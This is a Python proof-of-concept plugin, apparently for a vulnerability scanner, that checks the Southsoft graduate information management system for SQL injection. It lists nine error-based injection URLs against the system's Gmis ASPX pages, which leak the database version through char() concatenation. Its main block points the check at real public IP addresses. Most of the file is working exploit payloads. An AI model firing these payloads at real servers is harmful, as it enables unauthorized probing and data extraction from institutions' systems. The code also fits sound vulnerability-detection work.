#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:南软研究生信息管理系统SQL注入漏洞大礼包3
#Refer:http://www.wooyun.org/bugs/wooyun-2010-098771，http://www.wooyun.org/bugs/wooyun-2010-098767等

def assign(service,arg):
    if service=="southsoft":
        return True,arg 


def  audit(arg):
    ps=[
      'Gmis/pygl/kcxxwh_jsedit.aspx?kcbh=1201132%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--',
      'Gmis/pygl/jxsjsh_ds.aspx?xh=200902100005%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--',
      'Gmis/pygl/cjxshdlist.aspx?xh=200902100005%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--',
      'Gmis/dtjygl/dzbadd.aspx?id=1%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--',
      'Gmis/cjgl/zqsxsh.aspx?xh=200902100005%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--',
      'Gmis/Byyxwgl/bydbjgcxmx.aspx?id=1%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--',
      'gmis/SysMsg/sys_useEdit.aspx?id=%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--',
      'gmis/ZS/fbzsjzInfoedit.aspx?ID=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--',
      'Gmis/xw/fwhtlgjscedit.aspx?id=%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version--'
        ]
    for p in ps:
        url=arg+p
        code,head,res,errcode,_=curl.curl2(url)  
        if code==500 and "GAOJIMicrosoft" in res:
            security_hole(url)
        
        
if __name__=="__main__":
    from dummy import *
    audit(assign('southsoft','http://210.43.126.80:8080/')[1])
    # audit(assign('southsoft','http://61.187.179.68:8080/')[1])